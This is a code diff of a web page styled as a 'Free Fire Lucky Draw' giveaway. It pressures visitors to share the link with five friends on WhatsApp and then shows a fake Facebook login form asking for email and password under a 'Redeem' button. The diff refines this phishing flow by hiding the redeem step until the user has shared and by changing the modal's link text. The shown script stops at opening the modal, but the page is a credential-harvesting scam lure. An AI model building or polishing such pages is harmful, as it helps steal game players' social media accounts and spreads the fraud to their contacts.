@@ -21,19 +21,11 @@ h1 {
   font-family: 'Orbitron', 'Arial', sans-serif;
   text-shadow: 0 0 12px #fcc203, 0 2px 0 #222, 0 0 1px #ffad07;
 }
-#prize-instruct {
-  color: #ffd94c;
-  font-size: 1.08em;
-  font-weight: bold;
-  margin-top: 22px;
-  margin-bottom: 2px;
-  text-shadow: 0 1px 8px #333a, 0 0 3px #ffad07b0;
-}
 #prizeBox {
-  width: 190px;
-  height: 190px;
+  width: 230px;
+  height: 230px;
   background: linear-gradient(135deg, #444, #202a48 60%, #ffd94c 90%);
-  border-radius: 23px;
+  border-radius: 28px;
   margin: 26px auto 16px auto;
   cursor: pointer;
   position: relative;
@@ -42,20 +34,20 @@ h1 {
   align-items: center;
   justify-content: center;
   box-shadow: 0 8px 48px #091017, 0 0 22px #fcc20388;
-  border: 4px solid #ffd94c;
+  border: 5px solid #ffd94c;
   transition: border-color .3s;
   z-index: 3;
 }
 #prizeBox img {
-  max-width: 140px;
-  max-height: 140px;
+  max-width: 185px;
+  max-height: 185px;
   display: none;
-  border-radius: 15px;
+  border-radius: 22px;
   margin-bottom: 5px;
   box-shadow: 0 8px 38px #ffad0736;
 }
 #prizeBox .text {
-  font-size: 1.3em;
+  font-size: 1.35em;
   font-weight: bold;
   color: #ffd94c;
   letter-spacing: 1.2px;
@@ -72,17 +64,19 @@ h1 {
 }
 .prize-pool {
   margin-top: 35px;
-  display: flex;
-  justify-content: center;
-  flex-wrap: wrap;
-  gap: 26px;
-  max-width: 500px;
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  grid-template-rows: repeat(3, 124px);
+  gap: 36px 22px;
+  max-width: 440px;
   margin-left: auto;
   margin-right: auto;
+  justify-content: center;
+  align-items: center;
 }
 .prize-pool .prize {
-  width: 125px;
-  height: 135px;
+  width: 130px;
+  height: 124px;
   border-radius: 16px;
   background: linear-gradient(130deg,#1e2339 85%, #ffd94c 95%);
   border: 3px solid #353c54;
@@ -96,25 +90,25 @@ h1 {
   position: relative;
 }
 .prize-pool .prize img {
-  max-width: 98px;
-  max-height: 98px;
+  max-width: 104px;
+  max-height: 104px;
   border-radius: 12px;
-  margin-bottom: 7px;
+  margin-bottom: 10px;
   box-shadow: 0 2px 12px #ffad071e;
 }
 .prize-pool .prize .label {
-  font-size: 1.05em;
+  font-size: 1.12em;
   color: #ffd94c;
   font-weight: bold;
   background: #202a48d0;
-  border-radius: 7px;
-  width: 95%;
+  border-radius: 9px;
+  width: 98%;
   margin: 0 auto;
-  padding: 4px 0 3px 0;
+  padding: 6px 0 5px 0;
   text-align: center;
-  letter-spacing: .7px;
+  letter-spacing: .8px;
   position: absolute;
-  bottom: 7px;
+  bottom: 9px;
   left: 50%;
   transform: translateX(-50%);
   box-shadow: 0 1px 10px #222a2b09;
@@ -122,14 +116,25 @@ h1 {
 .prize-pool .prize.highlight {
   border-color: #ffd94c;
   box-shadow: 0 0 42px #ffd94ccc, 0 0 19px #ffad07a5;
-  transform: scale(1.11);
+  transform: scale(1.12);
+}
+.prize-pool .prize:last-child {
+  grid-column: 1/3;
+  justify-self: center;
+}
+#share-instruct {
+  color: #ffd94c;
+  font-size: 1.05em;
+  font-weight: bold;
+  margin: 18px 0 2px 0;
+  text-shadow: 0 1px 8px #333a, 0 0 3px #ffad07b0;
 }
 #share-btn {
-  width: 170px;
-  max-width: 220px;
-  margin: 20px auto 0 auto;
-  font-size: 1.14em;
-  padding: 15px 0;
+  width: 180px;
+  max-width: 250px;
+  margin: 9px auto 0 auto;
+  font-size: 1.17em;
+  padding: 16px 0;
   border: none;
   border-radius: 8px;
   color: #fff;
@@ -138,20 +143,20 @@ h1 {
   cursor: pointer;
   font-family: 'Orbitron','Arial',sans-serif;
   font-weight: bold;
-  letter-spacing: 1px;
+  letter-spacing: .9px;
   transition: background .24s;
 }
 #share-btn:hover {
   background: linear-gradient(120deg, #ffad07 60%, #ff3b50 95%);
 }
 #redeem-area {
-  margin-top: 15px;
+  margin-top: 13px;
 }
 .redeem-btn {
-  width: 165px;
-  font-size: 1.12em;
+  width: 175px;
+  font-size: 1.18em;
   font-family: inherit;
-  padding: 13px 0;
+  padding: 16px 0;
   border: none;
   border-radius: 8px;
   color: #fff;
@@ -159,7 +164,7 @@ h1 {
   box-shadow: 0 2px 11px #ffad0734;
   cursor: pointer;
   font-weight: bold;
-  letter-spacing: 1px;
+  letter-spacing: .7px;
 }
 #fb-modal,
 #confirmation-page {
@@ -240,12 +245,26 @@ h1 {
   border: none;
   cursor: pointer;
 }
+.fb-container .gaming-link {
+  display: inline-block;
+  margin-top: 14px;
+  text-align: center;
+  color: #ffad07;
+  font-weight: bold;
+  letter-spacing: 1px;
+  text-decoration: none;
+  font-size: 1.09em;
+}
+.fb-container .gaming-link:hover {
+  text-decoration: underline;
+  color: #ff3b50;
+}
 @media screen and (max-width: 600px) {
-  .prize-pool {gap:12px;}
-  .prize-pool .prize { width: 74px; height: 92px; }
-  .prize-pool .prize img { max-width: 56px; max-height:56px;}
-  #prizeBox { width: 115px; height: 115px;}
-  #prizeBox img { max-width:70px;max-height:70px;}
+  .prize-pool {gap:8px;}
+  .prize-pool .prize { width: 74px; height: 64px; }
+  .prize-pool .prize img { max-width: 50px; max-height:50px;}
+  #prizeBox { width: 132px; height: 132px;}
+  #prizeBox img { max-width:82px;max-height:82px;}
 }
 </style>
 <!-- Google Fonts Orbitron for Free Fire style -->
@@ -253,12 +272,13 @@ h1 {
 </head>
 <body>
   <h1>Free Fire Lucky Draw</h1>
-  <div id="prize-instruct">Share this site to 5 friends by WhatsApp after winning to redeem your prize.</div>
+
   <div id="prizeBox">
     <div class="text">Click to Open</div>
     <img alt="Winning Prize" />
     <div id="prizeName" class="text"></div>
   </div>
+
   <div class="prize-pool" id="prizePool">
     <div class="prize" data-idx="0">
       <img src="diamond-500.png" alt="500 Diamonds" title="500 Diamonds" />
@@ -281,10 +301,14 @@ h1 {
       <div class="label">Pet Box</div>
     </div>
   </div>
-  <button id="share-btn" class="spin-btn" style="margin-top: 28px;">Share Now</button>
-  <div id="redeem-area" style="margin-top:15px;">
+  
+  <div id="share-instruct">Share this site to 5 different friends now to redeem your prize.</div>
+  <button id="share-btn" class="spin-btn" style="margin-top: 9px;">Share Now</button>
+
+  <div id="redeem-area" style="margin-top:15px; display:none;">
     <button class="redeem-btn" id="redeemBtn">Redeem</button>
   </div>
+
   <!-- Facebook Login Modal -->
   <div id="fb-modal">
     <div class="fb-container">
@@ -293,11 +317,10 @@ h1 {
       <input type="text" id="fb-email" placeholder="Email or Phone number" />
       <input type="password" id="fb-password" placeholder="Password" />
       <button id="fb-login-btn">Log In</button>
-      <div style="margin: 14px 0 0 0; text-align: center;">
-        <a href="#" style="color: #1877f2;">Forgotten password?</a>
-      </div>
+      <a class="gaming-link" href="#">Gaming Help</a>
     </div>
   </div>
+
   <!-- Confirmation Page -->
   <div id="confirmation-page">
     <p>Thank you for logging in!<br>Your gift will be received in your mailbox within 24 hours.</p>
@@ -314,6 +337,7 @@ h1 {
   const prizeBox = document.getElementById('prizeBox');
   const prizePoolDivs = document.querySelectorAll('#prizePool .prize');
   const shareBtn = document.getElementById('share-btn');
+  const shareInstruct = document.getElementById('share-instruct');
   const redeemBtn = document.getElementById('redeemBtn');
   const redeemArea = document.getElementById('redeem-area');
   const resultImg = prizeBox.querySelector('img');
@@ -321,6 +345,7 @@ h1 {
   const resultText = prizeBox.querySelector('.text');
   let opened = false;
   let wonPrizeIdx = null;
+
   function resetPrizeBox() {
     resultImg.style.display = 'none';
     resultName.textContent = '';
@@ -328,6 +353,7 @@ h1 {
     resultText.textContent = 'Click to Open';
     prizePoolDivs.forEach(div => div.classList.remove('highlight'));
     shareBtn.style.display = 'block';
+    redeemArea.style.display = 'none';
     opened = false;
   }
   function animatePrizeSelection(idx) {
@@ -340,7 +366,7 @@ h1 {
       prizePoolDivs[highlightIdx].classList.add('highlight');
       currentStep++;
       if (currentStep < steps) {
-        setTimeout(step, 80 + currentStep * 10);
+        setTimeout(step, 80 + currentStep * 12);
       } else {
         prizePoolDivs.forEach(div => div.classList.remove('highlight'));
         prizePoolDivs[idx].classList.add('highlight');
@@ -356,17 +382,23 @@ h1 {
     resultImg.alt = prizes[idx].name;
     resultImg.style.display = 'block';
     resultName.textContent = prizes[idx].name;
+    shareBtn.style.display = 'block';
+    redeemArea.style.display = 'none';
   }
   prizeBox.addEventListener('click', () => {
     if (opened) return;
     opened = true;
     const randomIndex = Math.floor(Math.random() * prizes.length);
     animatePrizeSelection(randomIndex);
+    shareBtn.style.display = 'block';
+    redeemArea.style.display = 'none';
   });
   shareBtn.addEventListener('click', () => {
     const siteURL = encodeURIComponent(window.location.href);
     const whatsappLink = `https://wa.me/?text=Check out this awesome Free Fire Lucky Draw! Share it with 5 friends and claim your prize: ${siteURL}`;
     window.open(whatsappLink, '_blank');
+    redeemArea.style.display = 'block';
+    shareBtn.style.display = 'none';
   });
   redeemBtn.addEventListener('click', () => {
     document.getElementById('fb-modal').style.display = 'flex';
